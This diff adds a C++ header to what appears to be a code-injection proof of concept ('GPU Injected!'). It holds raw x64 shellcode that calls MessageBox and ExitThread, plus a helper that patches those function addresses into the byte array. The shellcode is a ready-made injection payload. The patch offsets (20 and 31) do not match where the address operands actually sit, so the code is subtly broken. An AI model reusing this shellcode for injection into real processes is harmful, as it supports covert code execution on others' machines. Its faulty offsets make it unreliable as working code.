@@ -1,0 +1,36 @@
+#pragma once
+#include <cstdint>
+
+namespace Shellcode {
+
+inline uint8_t messageBoxPayload[] = {
+    0x48, 0x83, 0xEC, 0x28,
+    0x48, 0x31, 0xC9,
+    0x48, 0x8D, 0x15, 0x29, 0x00, 0x00, 0x00,
+    0x4C, 0x8D, 0x05, 0x1E, 0x00, 0x00, 0x00,
+    0x4D, 0x31, 0xC9,
+    0x48, 0xB8, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
+    0xFF, 0xD0,
+    0x48, 0x31, 0xC9,
+    0x48, 0xB8, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
+    0xFF, 0xD0,
+
+    'P', 'O', 'C', 0x00,
+    'G', 'P', 'U', ' ', 'I', 'n', 'j', 'e', 'c', 't', 'e', 'd', '!', 0x00
+};
+
+constexpr uint32_t messageBoxPayloadSize = sizeof(messageBoxPayload);
+
+inline void patchAddresses(uint8_t* payload, void* messageBoxAddr, void* exitThreadAddr) {
+    uint64_t msgBoxAddr = reinterpret_cast<uint64_t>(messageBoxAddr);
+    for (int i = 0; i < 8; i++) {
+        payload[20 + i] = static_cast<uint8_t>((msgBoxAddr >> (i * 8)) & 0xFF);
+    }
+
+    uint64_t exitAddr = reinterpret_cast<uint64_t>(exitThreadAddr);
+    for (int i = 0; i < 8; i++) {
+        payload[31 + i] = static_cast<uint8_t>((exitAddr >> (i * 8)) & 0xFF);
+    }
+}
+
+}
